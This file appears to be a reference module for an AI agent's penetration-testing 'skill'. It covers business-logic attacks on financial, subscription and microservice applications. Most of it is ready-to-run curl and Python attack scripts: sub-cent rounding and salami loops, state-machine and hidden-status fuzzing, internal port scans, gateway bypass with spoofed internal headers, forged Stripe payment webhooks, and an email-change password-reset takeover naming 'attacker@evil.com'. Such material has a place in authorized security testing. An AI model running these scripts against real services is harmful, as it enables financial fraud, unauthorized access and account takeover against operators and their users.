# Business Logic - Advanced Attack Patterns

> Reference file for the business-logic skill. Load when the target has financial features,
> complex state machines, or microservice architecture.

> **TYPOGRAPHY RULE: NEVER use em dashes in any output. Use a hyphen (-) or rewrite.**

---

## Attack Class 10: Financial Rounding Exploitation

The goal: exploit how the application rounds fractional currency values to accumulate money from thin air.

**Fractional currency manipulation:**
- Submit transactions at sub-cent increments (0.001, 0.005, 0.009) and observe how the system rounds
- If the system rounds UP on credits and DOWN on debits, you have a rounding direction asymmetry

**Rounding direction abuse:**
```bash
# Test 1: Deposit a fractional amount and check the credited value
curl -s -X POST {target}/api/wallet/deposit \
  -H 'Authorization: Bearer {token}' \
  -H 'Content-Type: application/json' \
  -d '{"amount": 0.001, "currency": "USD"}'

# Check balance - did it round up to 0.01?
curl -s -X GET {target}/api/wallet/balance \
  -H 'Authorization: Bearer {token}'

# Test 2: Withdraw a fractional amount and check the debited value
curl -s -X POST {target}/api/wallet/withdraw \
  -H 'Authorization: Bearer {token}' \
  -H 'Content-Type: application/json' \
  -d '{"amount": 0.009, "currency": "USD"}'

# Check balance - did it round down to 0.00 debit?
curl -s -X GET {target}/api/wallet/balance \
  -H 'Authorization: Bearer {token}'
```

**Currency conversion loops:**
```bash
# Convert USD -> EUR -> GBP -> USD and measure if you end up with more than you started
# Each conversion step may round in your favor

# Step 1: Check starting balance
curl -s -X GET {target}/api/wallet/balance -H 'Authorization: Bearer {token}'

# Step 2: Convert USD to EUR
curl -s -X POST {target}/api/wallet/convert \
  -H 'Authorization: Bearer {token}' \
  -H 'Content-Type: application/json' \
  -d '{"from": "USD", "to": "EUR", "amount": 1.00}'

# Step 3: Convert EUR to GBP
curl -s -X POST {target}/api/wallet/convert \
  -H 'Authorization: Bearer {token}' \
  -H 'Content-Type: application/json' \
  -d '{"from": "EUR", "to": "GBP", "amount": "all"}'

# Step 4: Convert GBP back to USD
curl -s -X POST {target}/api/wallet/convert \
  -H 'Authorization: Bearer {token}' \
  -H 'Content-Type: application/json' \
  -d '{"from": "GBP", "to": "USD", "amount": "all"}'

# Step 5: Check ending balance - any gain?
curl -s -X GET {target}/api/wallet/balance -H 'Authorization: Bearer {token}'
```

**Salami attack automation:**
```python
# Automate thousands of micro-transactions, each gaining a fraction of a cent
import requests, time

BASE = "https://{target}/api"
HEADERS = {"Authorization": "Bearer {token}", "Content-Type": "application/json"}

def get_balance() -> float:
    r = requests.get(f"{BASE}/wallet/balance", headers=HEADERS, timeout=10)
    return float(r.json().get("balance", 0))

start_balance = get_balance()
print(f"Starting balance: {start_balance}")

NUM_ITERATIONS = 1000
for i in range(NUM_ITERATIONS):
    # Deposit a sub-cent amount
    requests.post(f"{BASE}/wallet/deposit", headers=HEADERS,
                  json={"amount": 0.004, "currency": "USD"}, timeout=10)
    if i % 100 == 0:
        current = get_balance()
        print(f"Iteration {i}: balance = {current}, gain = {current - start_balance}")

end_balance = get_balance()
gain = end_balance - start_balance
expected = NUM_ITERATIONS * 0.004
print(f"\nFinal balance: {end_balance}")
print(f"Expected deposit total: {expected}")
print(f"Actual gain: {gain}")
print(f"Rounding profit: {gain - expected}")
```

**Tax/fee calculation rounding:**
- Compare tax calculated per-item vs per-order - they may produce different totals
- Add items one at a time and check the running total vs adding all at once
- Look for tax rounding that always favors the customer (or the platform)

```bash
# Per-item tax test: add 3 items at $3.33 each with 10% tax
# Per-item: 3 x round(3.33 * 0.10) = 3 x 0.33 = $0.99 tax
# Per-order: round(9.99 * 0.10) = round(0.999) = $1.00 tax
# Difference: $0.01 per order - scales with volume

# Test: add items individually and check tax
for ITEM_ID in ITEM_1 ITEM_2 ITEM_3; do
  curl -s -X POST {target}/api/cart/add \
    -H 'Authorization: Bearer {token}' \
    -H 'Content-Type: application/json' \
    -d "{\"product_id\": \"${ITEM_ID}\", \"quantity\": 1}"
done

# Check cart total and tax breakdown
curl -s -X GET {target}/api/cart \
  -H 'Authorization: Bearer {token}' | python3 -c "
import sys, json
cart = json.load(sys.stdin)
print(f'Subtotal: {cart.get(\"subtotal\")}')
print(f'Tax: {cart.get(\"tax\")}')
print(f'Total: {cart.get(\"total\")}')
"
```

**Proof:** Demonstrate a net positive balance change through rounding exploitation over N transactions. Show starting balance, ending balance, expected total, and the rounding profit.

---

## Attack Class 11: Deep State Machine Exploitation

Go beyond simple step-skipping (Attack Class 3). Map the ENTIRE state machine and test every transition - not just the ones the UI exposes.

**Full state machine mapping methodology:**

1. **Identify all states** - browse the app, read API docs, check database schema if available, look at status fields in API responses (pending, active, suspended, cancelled, deleted, archived, locked, etc.)
2. **Map all transitions** - what user actions move an entity from one state to another? Document both UI-triggered and API-triggered transitions
3. **Test EVERY transition** - not just the ones the UI shows. If an order can be "pending", "processing", "shipped", "delivered", "returned", and "cancelled", test ALL 30 possible transitions (6 states x 5 possible destinations each)
4. **Test reverse transitions** - can you go from cancelled back to active? From deleted back to pending?
5. **Test impossible transitions** - pending directly to delivered (skipping processing and shipped)

```bash
# Map states by checking what status values the API accepts
for STATUS in pending active suspended cancelled deleted archived locked; do
  echo "Testing transition to: ${STATUS}"
  curl -s -X PUT {target}/api/orders/{order_id}/status \
    -H 'Authorization: Bearer {token}' \
    -H 'Content-Type: application/json' \
    -d "{\"status\": \"${STATUS}\"}" \
    -o /dev/null -w "Status: %{http_code}\n"
done
```

**Parallel state transitions:**
```python
# Two sessions modifying the same entity's state simultaneously
import threading, requests

URL = "https://{target}/api/orders/{order_id}/status"
HEADERS = {"Authorization": "Bearer {token}", "Content-Type": "application/json"}

results = []

def set_status(status: str):
    r = requests.put(URL, json={"status": status}, headers=HEADERS, timeout=10)
    results.append((status, r.status_code, r.text[:200]))

# Race: one thread cancels, another ships - what wins?
threads = [
    threading.Thread(target=set_status, args=("cancelled",)),
    threading.Thread(target=set_status, args=("shipped",)),
]
[t.start() for t in threads]
[t.join() for t in threads]

for status, code, body in results:
    print(f"Set to {status}: {code} - {body[:100]}")

# Check final state
r = requests.get(URL.replace("/status", ""), headers=HEADERS, timeout=10)
print(f"Final state: {r.json().get('status')}")
```

**State rollback exploitation:**
- Upgrade to premium plan, activate premium features (export data, create premium resources, unlock integrations)
- Downgrade back to free plan
- Check if premium features already activated remain accessible
- Check if premium resources created during the upgrade period are still usable

```bash
# Step 1: Upgrade to premium
curl -s -X POST {target}/api/subscription/upgrade \
  -H 'Authorization: Bearer {token}' \
  -H 'Content-Type: application/json' \
  -d '{"plan": "premium"}'

# Step 2: Use premium features - create premium resources
curl -s -X POST {target}/api/premium/export \
  -H 'Authorization: Bearer {token}' \
  -H 'Content-Type: application/json' \
  -d '{"type": "full_analytics"}'

# Step 3: Downgrade back to free
curl -s -X POST {target}/api/subscription/downgrade \
  -H 'Authorization: Bearer {token}' \
  -H 'Content-Type: application/json' \
  -d '{"plan": "free"}'

# Step 4: Can you still access the premium export?
curl -s -X GET {target}/api/premium/export/{export_id} \
  -H 'Authorization: Bearer {token}'
# If 200 - premium access persists after downgrade
```

**Orphaned state exploitation:**
- States that exist in the database but have no UI path to reach them
- Look for status values in API responses that never appear in the UI
- Try setting entities to those hidden states via API

```bash
# Discover hidden states by fuzzing the status field
for STATUS in draft internal beta test staging prerelease sandbox debug admin superadmin; do
  RESP=$(curl -s -X PUT {target}/api/account/status \
    -H 'Authorization: Bearer {token}' \
    -H 'Content-Type: application/json' \
    -d "{\"status\": \"${STATUS}\"}" -w "\n%{http_code}")
  CODE=$(echo "$RESP" | tail -1)
  BODY=$(echo "$RESP" | head -1)
  if [ "$CODE" != "400" ] && [ "$CODE" != "422" ]; then
    echo "INTERESTING - ${STATUS}: ${CODE} - ${BODY}"
  fi
done
```

**Dead state reactivation:**
- Cancel a subscription, then try to access subscriber-only features without re-subscribing
- Delete an account, then try to log in - does the session token still work?
- Expire a trial, then try to extend it by modifying the expiry field
- Soft-deleted resources that are still accessible via direct API calls

```bash
# Cancel subscription
curl -s -X POST {target}/api/subscription/cancel \
  -H 'Authorization: Bearer {token}'

# Wait, then try premium endpoints
curl -s -X GET {target}/api/premium/dashboard \
  -H 'Authorization: Bearer {token}'
# If 200 - access persists after cancellation

# Delete account
curl -s -X DELETE {target}/api/account \
  -H 'Authorization: Bearer {token}'

# Try the same token
curl -s -X GET {target}/api/user/me \
  -H 'Authorization: Bearer {token}'
# If 200 - session not invalidated on account deletion
```

**Subscription lifecycle attacks:**
1. Sign up for free trial
2. Upgrade to premium (billing starts next cycle)
3. Use all premium features immediately
4. Downgrade before the first billing cycle ends
5. Check if you were ever charged - and if premium features persist

**Proof:** Demonstrate reaching a state that should be unreachable, or gaining persistent access through state manipulation. Show the state transition path, the final state, and the access that should not exist.

---

## Attack Class 12: Cross-Microservice Logic Flaws

Modern apps split functionality across multiple services. Each service may enforce its own rules - or trust other services to do it. The gaps between services are where business logic bugs hide.

**Detection - how to identify microservice architectures:**
- Multiple API domains (api.target.com, auth.target.com, billing.target.com)
- Different error formats across endpoints (one returns JSON errors, another returns XML)
- Different tech stacks for different features (Node.js headers on /api/users, Python headers on /api/analytics)
- Service mesh headers in responses (x-request-id, x-b3-traceid, x-envoy-upstream-service-time)
- Inconsistent rate limiting across endpoints
- Different authentication mechanisms on different paths

**Inconsistent authorization across service boundaries:**
```bash
# Frontend gateway checks permission, backend service trusts all requests from gateway
# Find the backend service URL and call it directly

# Step 1: Identify internal service URLs from error messages, JS bundles, or headers
# Look for: x-upstream-addr, x-backend-server, via headers, error stack traces

# Step 2: Try accessing the backend service directly (if exposed)
curl -s -X GET {target}:8080/internal/admin/users \
  -H 'Content-Type: application/json'
# No auth header - does the internal service require one?

# Step 3: Access admin endpoint through gateway with non-admin token
curl -s -X GET {target}/api/admin/users \
  -H 'Authorization: Bearer {regular_user_token}'
# Gateway may check role, but does the downstream service re-check?

# Step 4: Try internal service headers that bypass gateway auth
curl -s -X GET {target}/api/admin/users \
  -H 'X-Internal-Service: true' \
  -H 'X-Service-Name: frontend'
```

**Data synchronization lag exploitation:**
```python
# Update your role in one service, access protected resources in another
# before the role change propagates
import requests, threading, time

BASE = "https://{target}"
HEADERS = {"Authorization": "Bearer {token}", "Content-Type": "application/json"}

results = []

def downgrade_role():
    """Trigger a role change in the auth service"""
    r = requests.post(f"{BASE}/api/auth/role", json={"role": "viewer"},
                      headers=HEADERS, timeout=10)
    results.append(("downgrade", r.status_code))

def access_admin():
    """Try to access admin resource in the app service"""
    r = requests.get(f"{BASE}/api/app/admin/export", headers=HEADERS, timeout=10)
    results.append(("admin_access", r.status_code, r.text[:200]))

# Fire both simultaneously - the app service may still see the old role
t1 = threading.Thread(target=downgrade_role)
t2 = threading.Thread(target=access_admin)
t1.start()
t2.start()
t1.join()
t2.join()

for r in results:
    print(r)
```

**API gateway bypass:**
```bash
# Access backend services directly, bypassing gateway validation
# Common internal ports: 8080, 8081, 3000, 5000, 9090

# Scan for exposed internal service ports
for PORT in 8080 8081 3000 5000 9090 4000 8443 8888; do
  RESP=$(curl -s -o /dev/null -w "%{http_code}" --connect-timeout 3 \
    "https://{target}:${PORT}/health")
  if [ "$RESP" != "000" ]; then
    echo "Port ${PORT} responds: ${RESP}"
  fi
done

# Try internal paths that the gateway normally blocks
for PATH in /internal /admin /debug /metrics /actuator /health /status /_internal; do
  curl -s -X GET "{target}${PATH}" \
    -H 'Authorization: Bearer {token}' \
    -o /dev/null -w "${PATH}: %{http_code}\n"
done
```

**Eventual consistency abuse:**
```bash
# Exploit the window between a write and its propagation to all read replicas
# Example: change email, then quickly request password reset to OLD email

# Step 1: Change email to attacker-controlled address
curl -s -X PUT {target}/api/user/email \
  -H 'Authorization: Bearer {token}' \
  -H 'Content-Type: application/json' \
  -d '{"email": "attacker@evil.com"}'

# Step 2: Immediately request password reset (may hit a read replica with old email)
curl -s -X POST {target}/api/auth/reset-password \
  -H 'Content-Type: application/json' \
  -d '{"email": "original@victim.com"}'
# If the reset email goes to the old address, the read replica hasn't caught up
```

**Trust boundary violations:**
```bash
# Internal services trust each other's claims without verification
# If you can reach a low-privilege internal service, use it to access high-privilege ones

# Look for service-to-service auth patterns in headers
curl -s -v -X GET {target}/api/billing/invoices \
  -H 'Authorization: Bearer {token}' 2>&1 | grep -i "x-service\|x-internal\|x-forwarded"

# Spoof internal service identity
curl -s -X GET {target}/api/billing/invoices \
  -H 'X-Service-Auth: internal-service-key' \
  -H 'X-Source-Service: user-service' \
  -H 'X-Internal-Request: true'
```

**Webhook/callback spoofing:**
```bash
# If Service A trusts callbacks from Service B, spoof the callback
# Common targets: payment webhooks, email verification callbacks, OAuth callbacks

# Step 1: Find the webhook endpoint (check JS bundles, API docs, common paths)
for ENDPOINT in /webhooks/stripe /webhooks/paypal /api/webhooks/payment /callbacks/verify; do
  curl -s -X POST "{target}${ENDPOINT}" \
    -H 'Content-Type: application/json' \
    -d '{"test": true}' \
    -o /dev/null -w "${ENDPOINT}: %{http_code}\n"
done

# Step 2: Spoof a payment success webhook (no signature verification)
curl -s -X POST {target}/webhooks/stripe \
  -H 'Content-Type: application/json' \
  -d '{
    "type": "checkout.session.completed",
    "data": {
      "object": {
        "id": "cs_test_spoofed",
        "payment_status": "paid",
        "amount_total": 0,
        "metadata": {
          "user_id": "{your_user_id}",
          "plan": "enterprise"
        }
      }
    }
  }'

# Step 3: Check if your account was upgraded
curl -s -X GET {target}/api/user/me \
  -H 'Authorization: Bearer {token}' | python3 -c "
import sys, json
user = json.load(sys.stdin)
print(f'Plan: {user.get(\"plan\", \"unknown\")}')
print(f'Role: {user.get(\"role\", \"unknown\")}')
"
```

**Proof:** Demonstrate unauthorized access by exploiting the gap between services. Show that a request bypasses authorization by going around the gateway, exploiting sync lag, or spoofing inter-service communication.

---

## Updated Hypothesis Generation Table

Expanded triggers including the new attack classes:

| App Feature | Business Logic Hypotheses to Generate |
|------------|---------------------------------------|
| Checkout / payment | Price manipulation, payment bypass, race on limited stock, rounding exploitation |
| Coupons / promo codes | Replay, stacking, cross-account sharing, negative discount |
| Subscriptions / plans | Trial abuse, downgrade bypass, feature access post-cancel, state rollback, dead state reactivation |
| Multi-user / teams | Tenant isolation, role escalation, cross-org object access |
| Referral / affiliate | Self-referral, circular chains, credit without signup |
| File uploads / storage | Quota bypass, shared storage IDOR, file access post-delete |
| Email verification | Bypass before verification, reuse old links |
| Password / account | Reset flow bypass, concurrent session after reset, eventual consistency abuse |
| API quotas | Negative consumption, shared quota abuse, plan bypasses |
| Order / fulfillment | Deep state machine mapping, parallel state transitions, orphaned states, reverse transitions |
| Currency / wallet | Rounding direction abuse, currency conversion loops, salami attacks, tax rounding |
| Multiple API domains | Gateway bypass, inconsistent auth, trust boundary violations, sync lag exploitation |
| Webhooks / callbacks | Callback spoofing, signature bypass, replay without idempotency check |
| Microservice indicators | Service mesh header abuse, internal port access, inter-service trust exploitation |
